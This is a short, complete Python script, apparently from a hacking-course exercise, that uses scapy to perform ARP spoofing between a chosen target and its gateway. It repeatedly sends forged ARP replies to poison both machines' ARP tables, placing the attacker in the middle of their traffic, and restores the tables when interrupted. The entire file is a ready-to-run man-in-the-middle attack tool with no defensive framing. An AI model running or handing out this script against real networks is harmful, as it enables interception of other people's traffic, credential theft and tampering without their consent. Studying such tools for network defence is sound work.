#! usr/bin/env python

import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP to spoof")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP to spoof")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify a default gateway IP, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        # sent_packets_count = sent_packets_count + 2
        sent_packets_count += 2
        # print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C .... resetting ARP tables .... please wait")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("[-] ARP tables have been restored, quitting....\n ")






